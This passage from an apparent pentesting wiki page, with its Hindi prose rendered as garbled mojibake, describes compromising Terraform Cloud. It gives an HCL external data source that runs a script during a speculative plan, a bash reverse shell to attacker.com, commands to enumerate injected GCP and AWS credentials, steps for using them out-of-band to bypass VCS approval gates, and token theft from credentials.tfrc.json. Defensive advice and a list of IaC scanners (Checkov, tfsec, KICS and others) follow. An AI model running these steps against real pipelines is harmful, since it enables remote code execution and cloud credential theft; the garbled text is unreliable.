- speculative plan рдХреЗ рджреМрд░рд╛рди external data source рдФрд░ Terraform Cloud "cloud" block рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ VCS-backed workspace рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП code execution рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВ:
```hcl
terraform {
cloud {
organization = "acmecorp"
workspaces { name = "gcp-infra-prod" }
}
}

data "external" "exec" {
program = ["bash", "./rsync.sh"]
}
```
TFC runner рдкрд░ reverse shell рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП rsync.sh рдХрд╛ рдЙрджрд╛рд╣рд░рдг:
```bash
#!/usr/bin/env bash
bash -c 'exec bash -i >& /dev/tcp/attacker.com/19863 0>&1'
```
ephemeral runner рдкрд░ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдиреБрдорд╛рдирд┐рдд рдпреЛрдЬрдирд╛ рдЪрд▓рд╛рдПрдБ:
```bash
terraform init
terraform plan
```
- Runner рд╕реЗ injected cloud credentials рдХреЛ enumerate рдФрд░ exfiltrate рдХрд░реЗрдВред Runs рдХреЗ рджреМрд░рд╛рди, TFC provider credentials рдХреЛ files рдФрд░ environment variables рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ inject рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```bash
env | grep -i gcp || true
env | grep -i aws || true
```
Runner рдХреА working directory рдореЗрдВ рдЕрдкреЗрдХреНрд╖рд┐рдд рдлрд╝рд╛рдЗрд▓реЗрдВ:
- GCP:
- `tfc-google-application-credentials` (Workload Identity Federation JSON рдХреЙрдиреНрдлрд╝рд┐рдЧ)
- `tfc-gcp-token` (short-lived GCP рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди)
- AWS:
- `tfc-aws-shared-config` (web identity/OIDC role assumption рдХреЙрдиреНрдлрд╝рд┐рдЧ)
- `tfc-aws-token` (short-lived рдЯреЛрдХрди; рдХреБрдЫ рд╕рдВрдЧрдарди рд╕реНрдерд┐рд░ keys рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)

- VCS gates рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП short-lived credentials рдХреЛ out-of-band рддрд░реАрдХреЗ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:

GCP (gcloud):
```bash
export GOOGLE_APPLICATION_CREDENTIALS=./tfc-google-application-credentials
gcloud auth login --cred-file="$GOOGLE_APPLICATION_CREDENTIALS"
gcloud config set project <PROJECT_ID>
```
AWS (AWS CLI):
```bash
export AWS_CONFIG_FILE=./tfc-aws-shared-config
export AWS_PROFILE=default
aws sts get-caller-identity
```
With these creds, attackers can create/modify/destroy resources directly using native CLIs, sidestepping PR-based workflows that block `apply` via VCS.

- рд░рдХреНрд╖рд╛ рд╕рдВрдмрдВрдзреА рдорд╛рд░реНрдЧрджрд░реНрд╢рди:
- TFC рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ/рдЯреАрдореЛрдВ рдФрд░ tokens рдкрд░ рдиреНрдпреВрдирддрдо рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд▓рд╛рдЧреВ рдХрд░реЗрдВред рд╕рджрд╕реНрдпрддрд╛рдУрдВ рдХрд╛ рдСрдбрд┐рдЯ рдХрд░реЗрдВ рдФрд░ рд╡реНрдпрд╛рдкрдХ 'owners' рд░реЛрд▓ рд╕реЗ рдмрдЪреЗрдВред
- рд╕рдВрд╡реЗрджрдирд╢реАрд▓ VCS-backed workspaces рдкрд░ `plan` рдЕрдиреБрдорддрд┐ рдЬрд╣рд╛рдБ рд╕рдВрднрд╡ рд╣реЛ рд╕реАрдорд┐рдд рдХрд░реЗрдВред
- Sentinel policies рдХреЗ рд╕рд╛рде provider/data source allowlists рд▓рд╛рдЧреВ рдХрд░реЗрдВ рддрд╛рдХрд┐ `data "external"` рдпрд╛ рдЕрдЬреНрдЮрд╛рдд providers рдХреЛ рдмреНрд▓реЙрдХ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред HashiCorp рдХреА provider filtering рдкрд░ guidance рджреЗрдЦреЗрдВред
- рд╕реНрдерд┐рд░ cloud credentials рдХреЗ рдмрдЬрд╛рдп OIDC/WIF рдХреЛ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рджреЗрдВ; runners рдХреЛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдорд╛рдиреЗрдВред speculative plan runs рдФрд░ unexpected egress рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░реЗрдВред
- `tfc-*` credential artifacts рдХреА exfiltration рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдБ рдФрд░ plans рдХреЗ рджреМрд░рд╛рди рд╕рдВрджрд┐рдЧреНрдз `external` program рдЙрдкрдпреЛрдЧ рдкрд░ рдЕрд▓рд░реНрдЯ рдХрд░реЗрдВред

## Terraform Cloud рдХрд╛ рд╕рдордЭреМрддрд╛

### Using a token

рдЬреИрд╕рд╛ рдХрд┐ **[explained in this post](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)**, terraform CLI stores tokens in plaintext at **`~/.terraform.d/credentials.tfrc.json`**. рдЪреЛрд░реА рдХрд┐рдП рдЧрдП рдЗрд╕ token рд╕реЗ рдПрдХ attacker token рдХреЗ рд╕реНрдХреЛрдк рдХреЗ рднреАрддрд░ user рдХрд╛ impersonate рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕ token рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ org/workspace рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ:
```bash
GET https://app.terraform.io/api/v2/organizations/acmecorp/workspaces/gcp-infra-prod
Authorization: Bearer <TF_TOKEN>
```
Then it's possible to run arbitrary code using **`terraform plan`** as explained in the previous chapter.

### рдХреНрд▓рд╛рдЙрдб рддрдХ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдирд╛

рдлрд┐рд░, рдпрджрд┐ runner рдХрд┐рд╕реА cloud environment рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИ, рддреЛ runner рд╕реЗ рдЬреБрдбрд╝реА principal рдХрд╛ token рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдФрд░ рдЙрд╕реЗ out of band рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред

- **GCP files (present in current run working directory)**
- `tfc-google-application-credentials` тАФ JSON config for Workload Identity Federation(WIF) that tells Google how to exchange the external identity.
- `tfc-gcp-token` тАФ рдЕрд▓реНрдкрдХрд╛рд▓рд┐рдХ (тЙИ1 hour) GCP access token рдЬреЛ рдКрдкрд░ рд╕рдВрджрд░реНрднрд┐рдд рд╣реИ

- **AWS files**
- `tfc-aws-shared-config` тАФ JSON for web identity federation/OIDC role assumption
(preferred over static keys).
- `tfc-aws-token` тАФ shortтАСlived token, рдпрд╛ misconfigured рд╣реЛрдиреЗ рдкрд░ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ static IAM keysред


## Automatic Audit Tools

### [**Snyk Infrastructure as Code (IaC)**](https://snyk.io/product/infrastructure-as-code-security/)

Snyk рдПрдХ рд╡реНрдпрд╛рдкрдХ Infrastructure as Code (IaC) рд╕реНрдХреИрдирд┐рдВрдЧ рд╕рдорд╛рдзрд╛рди рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ Terraform, CloudFormation, Kubernetes, рдФрд░ рдЕрдиреНрдп IaC рдлреЙрд░реНрдореИрдЯреНрд╕ рдореЗрдВ рдХрдордЬреЛрд░рд┐рдпрд╛рдБ рдФрд░ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рддрд╛ рд╣реИред

- **Features:**
- рд░реАрдпрд▓-рдЯрд╛рдЗрдо рд╕реНрдХреИрдирд┐рдВрдЧ рд╕реБрд░рдХреНрд╖рд╛ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдФрд░ рдЕрдиреБрдкрд╛рд▓рди рдореБрджреНрджреЛрдВ рдХреЗ рд▓рд┐рдПред
- Version control systems (GitHub, GitLab, Bitbucket) рдХреЗ рд╕рд╛рде рдЗрдВрдЯреАрдЧреНрд░реЗрд╢рдиред
- Automated fix pull requestsред
- рд╡рд┐рд╕реНрддреГрдд рд╕реБрдзрд╛рд░рд╛рддреНрдордХ рд╕реБрдЭрд╛рд╡ред
- **Sign Up:** Create an account on [Snyk](https://snyk.io/).
```bash
brew tap snyk/tap
brew install snyk
snyk auth
snyk iac test /path/to/terraform/code
```
### [Checkov](https://github.com/bridgecrewio/checkov) <a href="#install-checkov-from-pypi" id="install-checkov-from-pypi"></a>

**Checkov** рдПрдХ static code analysis tool рд╣реИ infrastructure as code (IaC) рдХреЗ рд▓рд┐рдП, рдФрд░ images рдФрд░ open source packages рдХреЗ рд▓рд┐рдП рдПрдХ software composition analysis (SCA) tool рднреА рд╣реИред

рдпрд╣ рдЙрди cloud infrastructure рдХреЛ рд╕реНрдХреИрди рдХрд░рддрд╛ рд╣реИ рдЬреЛ [Terraform](https://terraform.io/), [Terraform plan](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md), [Cloudformation](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Cloudformation.md), [AWS SAM](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/AWS%20SAM.md), [Kubernetes](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kubernetes.md), [Helm charts](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Helm.md), [Kustomize](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kustomize.md), [Dockerfile](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Dockerfile.md), [Serverless](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Serverless%20Framework.md), [Bicep](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Bicep.md), [OpenAPI](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/OpenAPI.md), [ARM Templates](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Azure%20ARM%20templates.md), or [OpenTofu](https://opentofu.org/) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ provision рдХреА рдЧрдИ cloud infrastructure рдХреЛ рд╕реНрдХреИрди рдХрд░рддрд╛ рд╣реИ, рдФрд░ graph-based scanning рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ security рдФрд░ compliance misconfigurations рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рддрд╛ рд╣реИред

рдпрд╣ [Software Composition Analysis (SCA) scanning](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Sca.md) рдХрд░рддрд╛ рд╣реИ, рдЬреЛ open source packages рдФрд░ images рдореЗрдВ Common Vulnerabilities and Exposures (CVEs) рдХреЗ рд▓рд┐рдП рдПрдХ scan рд╣реИред
```bash
pip install checkov
checkov -d /path/to/folder
```
### [terraform-compliance](https://github.com/terraform-compliance/cli)

From the [**docs**](https://github.com/terraform-compliance/cli): `terraform-compliance` рдПрдХ рд╣рд▓реНрдХрд╛, рд╕реБрд░рдХреНрд╖рд╛ рдФрд░ рдЕрдиреБрдкрд╛рд▓рди-рдХреЗрдВрджреНрд░рд┐рдд рдЯреЗрд╕реНрдЯ рдлреНрд░реЗрдорд╡рд░реНрдХ рд╣реИ рдЬреЛ terraform рдХреЗ рд▓рд┐рдП infrastructure-as-code рдореЗрдВ negative testing рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред

- **compliance:** рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рд▓рд╛рдЧреВ рдХреЛрдб рд╕реБрд░рдХреНрд╖рд╛ рдорд╛рдирдХреЛрдВ рдФрд░ рдЖрдкрдХреЗ рд╕реНрд╡рдпрдВ рдХреЗ рдХрд╕реНрдЯрдо рдорд╛рдирдХреЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░ рд░рд╣рд╛ рд╣реИред
- **behaviour driven development:** рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рд▓рдЧрднрдЧ рд╣рд░ рдЪреАрдЬрд╝ рдХреЗ рд▓рд┐рдП BDD рд╣реИ, IaC рдХреЗ рд▓рд┐рдП рдХреНрдпреЛрдВ рдирд╣реАрдВ?
- **portable:** рдмрд╕ рдЗрд╕реЗ `pip` рд╕реЗ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░реЗрдВ рдпрд╛ `docker` рдХреЗ рдЬрд░рд┐рдП рдЪрд▓рд╛рдПрдБред See [Installation](https://terraform-compliance.com/pages/installation/)
- **pre-deploy:** рдпрд╣ рдЖрдкрдХреЗ рдХреЛрдб рдХреЛ рдбрд┐рдкреНрд▓реЙрдп рд╣реЛрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рд╡реИрд▓рд┐рдбреЗрдЯ рдХрд░рддрд╛ рд╣реИ
- **easy to integrate:** рдпрд╣ рдЖрдкрдХреЗ pipeline (рдпрд╛ git hooks рдореЗрдВ) рдЪрд▓ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╕рднреА deployments рд╡реИрд▓рд┐рдбреЗрдЯ рд╣реЛрдВред
- **segregation of duty:** рдЖрдк рдЕрдкрдиреЗ рдЯреЗрд╕реНрдЯ рдПрдХ рдЕрд▓рдЧ repository рдореЗрдВ рд░рдЦ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд╣рд╛рдБ рдПрдХ рдЕрд▓рдЧ рдЯреАрдо рдЬрд╝рд┐рдореНрдореЗрджрд╛рд░ рд╣реЛрдЧреАред

> [!NOTE]
> рджреБрд░реНрднрд╛рдЧреНрдпрд╡рд╢ рдЕрдЧрд░ рдХреЛрдб рдХрд┐рд╕реА рдРрд╕реЗ providers рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ рдЬрд┐рдирдХрд╛ рдЖрдкрдХреЛ рдПрдХреНрд╕реЗрд╕ рдирд╣реАрдВ рд╣реИ, рддреЛ рдЖрдк `terraform plan` рдирд╣реАрдВ рдЪрд▓рд╛ рдкрд╛рдПрдБрдЧреЗ рдФрд░ рдЗрд╕ рдЯреВрд▓ рдХреЛ рд░рди рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдБрдЧреЗред
```bash
pip install terraform-compliance
terraform plan -out=plan.out
terraform-compliance -f /path/to/folder
```
### [tfsec](https://github.com/aquasecurity/tfsec)

From the [**docs**](https://github.com/aquasecurity/tfsec): tfsec рдЖрдкрдХреЗ terraform рдХреЛрдб рдХрд╛ static analysis рдХрд░рдХреЗ рд╕рдВрднрд╛рд╡рд┐рдд misconfigurations рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рддрд╛ рд╣реИред

- тШБя╕П рд╕рднреА рдкреНрд░рдореБрдЦ (рдФрд░ рдХреБрдЫ рдЫреЛрдЯреЗ) рдХреНрд▓рд╛рдЙрдб рдкреНрд░рджрд╛рддрд╛рдУрдВ рдореЗрдВ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рд▓рд┐рдП рдЪреЗрдХ рдХрд░рддрд╛ рд╣реИ
- тЫФ рд╕реИрдХрдбрд╝реЛрдВ рдЕрдВрддрд░реНрдирд┐рд░реНрдорд┐рдд рдирд┐рдпрдо
- ЁЯкЖ modules (local рдФрд░ remote) рдХреЛ рд╕реНрдХреИрди рдХрд░рддрд╛ рд╣реИ
- тЮХ HCL expressions рдХреЗ рд╕рд╛рде-рд╕рд╛рде literal values рдХрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд░рддрд╛ рд╣реИ
- тЖкя╕П Terraform functions рдЬреИрд╕реЗ `concat()` рдХрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд░рддрд╛ рд╣реИ
- ЁЯФЧ Terraform resources рдХреЗ рдмреАрдЪ рд╕рдВрдмрдВрдзреЛрдВ рдХрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд░рддрд╛ рд╣реИ
- ЁЯз░ Terraform CDK рдХреЗ рд╕рд╛рде рд╕рдВрдЧрдд рд╣реИ
- ЁЯЩЕ user-defined Rego policies рдХреЛ рд▓рд╛рдЧреВ (рдФрд░ рдмреЗрд╣рддрд░ рдмрдирд╛рддрд╛ рд╣реИ)
- ЁЯУГ рдХрдИ output formats рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ: lovely (default), JSON, SARIF, CSV, CheckStyle, JUnit, text, Gif.
- ЁЯЫая╕П рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдпреЛрдЧреНрдп (CLI flags рдФрд░/рдпрд╛ config file рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ)
- тЪб рдмрд╣реБрдд рддреЗрдЬрд╝, рдмрдбрд╝реЗ repositories рдХреЛ рдЬрд▓реНрджреА рд╕реНрдХреИрди рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо
```bash
brew install tfsec
tfsec /path/to/folder
```
### [terrascan](https://github.com/tenable/terrascan)

Terrascan Infrastructure as Code рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реНрдЯреИрдЯрд┐рдХ рдХреЛрдб рд╡рд┐рд╢реНрд▓реЗрд╖рдХ рд╣реИред Terrascan рдЖрдкрдХреЛ рдирд┐рдореНрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ:

- Infrastructure as Code рдореЗрдВ misconfigurations рдХреЛ рд╕рд╣рдЬрддрд╛ рд╕реЗ рд╕реНрдХреИрди рдХрд░рдирд╛ред
- рдкреНрд░реЛрд╡рд┐рдЬрди рдХрд┐рдП рдЧрдП рдХреНрд▓рд╛рдЙрдб рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдореЗрдВ рдЙрди configuration рдмрджрд▓рд╛рд╡реЛрдВ рдХреА рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ рдХрд░рдирд╛ рдЬреЛ posture drift рдкреИрджрд╛ рдХрд░рддреЗ рд╣реИрдВ, рдФрд░ secure posture рдкрд░ рд╡рд╛рдкрд╕ рд▓реМрдЯрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдмрдирд╛рдирд╛ред
- рд╕реБрд░рдХреНрд╖рд╛ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдФрд░ compliance рдЙрд▓реНрд▓рдВрдШрдиреЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ред
- рдХреНрд▓рд╛рдЙрдб-рдиреЗрдЯрд┐рд╡ рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдХреЛ provision рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдЬреЛрдЦрд┐рдореЛрдВ рдХреЛ рдХрдо рдХрд░рдирд╛ред
- рд▓реЛрдХрд▓ рд░реВрдк рд╕реЗ рдЪрд▓рд╛рдиреЗ рдпрд╛ рдЕрдкрдиреЗ CI\CD рдХреЗ рд╕рд╛рде рдЗрдВрдЯреАрдЧреНрд░реЗрдЯ рдХрд░рдиреЗ рдХреА рд▓рдЪреАрд▓рд╛рдкрди рдкреНрд░рджрд╛рди рдХрд░рдирд╛ред
```bash
brew install terrascan
terrascan scan -d /path/to/folder
```
### [KICKS](https://github.com/Checkmarx/kics)

рдЕрдкрдиреЗ infrastructure-as-code рдХреЗ рд╡рд┐рдХрд╛рд╕ рдЪрдХреНрд░ рдХреЗ рд╢реБрд░реБрдЖрддреА рдЪрд░рдгреЛрдВ рдореЗрдВ Checkmarx рдХреЗ **KICS** рдХреЗ рд╕рд╛рде рд╕реБрд░рдХреНрд╖рд╛ рдХрдордЬреЛрд░рд┐рдпрд╛рдБ, рдЕрдиреБрдкрд╛рд▓рди рд╕рдорд╕реНрдпрд╛рдПрдБ рдФрд░ рдЗрдиреНрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдХреЗ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдЦреЛрдЬреЗрдВред

**KICS** stands for **K**eeping **I**nfrastructure as **C**ode **S**ecure тАФ рдпрд╣ open source рд╣реИ рдФрд░ рдХрд┐рд╕реА рднреА cloud native рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдЖрд╡рд╢реНрдпрдХ рдЙрдкрдХрд░рдг рд╣реИред
```bash
docker run -t -v $(pwd):/path checkmarx/kics:latest scan -p /path -o "/path/"
```
### [Terrascan](https://github.com/tenable/terrascan)

[**docs**](https://github.com/tenable/terrascan) рдХреЗ рдЕрдиреБрд╕рд╛рд░: Terrascan Infrastructure as Code рдХреЗ рд▓рд┐рдП рдПрдХ static code analyzer рд╣реИред Terrascan рдЖрдкрдХреЛ рдирд┐рдореНрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ:

- рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рд▓рд┐рдП infrastructure as code рдХреЛ рд╕рд╣рдЬрддрд╛ рд╕реЗ scan рдХрд░реЗрдВред
- provisioned cloud infrastructure рдореЗрдВ рдРрд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░реЗрдВ рдЬреЛ posture drift рдЙрддреНрдкрдиреНрди рдХрд░рддреЗ рд╣реЛрдВ, рдФрд░ secure posture рдкрд░ рд╡рд╛рдкрд╕ рд▓реМрдЯрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдмрдиреЗрдВред
- рд╕реБрд░рдХреНрд╖рд╛ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдФрд░ рдЕрдиреБрдкрд╛рд▓рди рдЙрд▓реНрд▓рдВрдШрдиреЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдБред
- cloud native infrastructure provisioning рд╕реЗ рдкрд╣рд▓реЗ рдЬреЛрдЦрд┐рдо рдХрдо рдХрд░реЗрдВред
- рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдЪрд▓рд╛рдиреЗ рдпрд╛ рдЕрдкрдиреЗ CI\CD рдХреЗ рд╕рд╛рде integrate рдХрд░рдиреЗ рдХреА рд▓рдЪреАрд▓рд╛рдкрди рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред
```bash
brew install terrascan
```
## рд╕рдВрджрд░реНрдн

- [Atlantis Security](atlantis-security.md)
- [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
- [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
- [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)
- [https://github.com/offensive-actions/terraform-provider-statefile-rce](https://github.com/offensive-actions/terraform-provider-statefile-rce)
- [Terraform Cloud token abuse turns speculative plan into remote code execution](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)
- [Terraform Cloud рдЕрдиреБрдорддрд┐рдпрд╛рдБ](https://developer.hashicorp.com/terraform/cloud-docs/users-teams-organizations/permissions)
- [Terraform Cloud API тАУ Show workspace](https://developer.hashicorp.com/terraform/cloud-docs/api-docs/workspaces#show-workspace)
- [AWS рдкреНрд░рджрд╛рддрд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди](https://registry.terraform.io/providers/hashicorp/aws/latest/docs#provider-configuration)
- [AWS CLI тАУ OIDC role assumption](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-role.html#cli-configure-role-oidc)
- [GCP provider тАУ Using Terraform Cloud](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider_reference.html#using-terraform-cloud)
- [Terraform тАУ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕](https://developer.hashicorp.com/terraform/tutorials/configuration-language/sensitive-variables)
- [Snyk Labs тАУ Gitflops: Terraform automation platforms рдХреЗ рдЦрддрд░реЗ](https://labs.snyk.io/resources/gitflops-dangers-of-terraform-automation-platforms/)

{{#include ../banners/hacktricks-training.md}}
